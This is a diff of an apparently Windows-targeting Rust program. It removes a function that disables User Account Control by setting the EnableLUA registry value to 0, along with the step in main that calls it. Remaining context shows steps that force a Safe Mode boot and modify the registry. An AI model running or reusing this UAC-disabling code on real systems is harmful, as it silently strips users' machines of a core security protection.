@@ -2,39 +2,11 @@ use std::process::{Command, Stdio, exit};
 use std::path::{Path};
 use std::fs::{File};
 use std::io::{self, Write};
-use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE, KEY_WRITE};
+use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_WRITE};
 use winreg::RegKey;
 use std::fs;
 use std::env;
 use std::thread;
-
-fn disable_uac() -> io::Result<()> {
-    // Open the registry key for User Account Control
-    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
-
-    let uac_key = match hkcu.open_subkey_with_flags(
-        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
-        KEY_SET_VALUE
-    ) {
-        Ok(key) => key,
-        Err(e) => {
-            eprintln!("Failed to open UAC registry key: {}", e);
-            return Err(e);
-        }
-    };
-
-    // Set EnableLUA to 0 to disable UAC
-    match uac_key.set_value("EnableLUA", &0u32) {
-        Ok(_) => {
-            println!("UAC has been disabled (EnableLUA set to 0).");
-            Ok(())
-        }
-        Err(e) => {
-            eprintln!("Failed to modify UAC registry value: {}", e);
-            Err(e)
-        }
-    }
-}
 
 fn enable_safe_mode() -> io::Result<()> {
     // Set the system to boot in Safe Mode
@@ -343,11 +315,6 @@ fn main() {
     // Step 8: Modify Registry
     if let Err(e) = modify_registry() {
         eprintln!("Error modifying registry: {}", e);
-    }
-
-    // Step 9: Disable UAC
-    if let Err(e) = disable_uac() {
-        eprintln!("Error disabling UAC: {}", e);
     }
 
 }
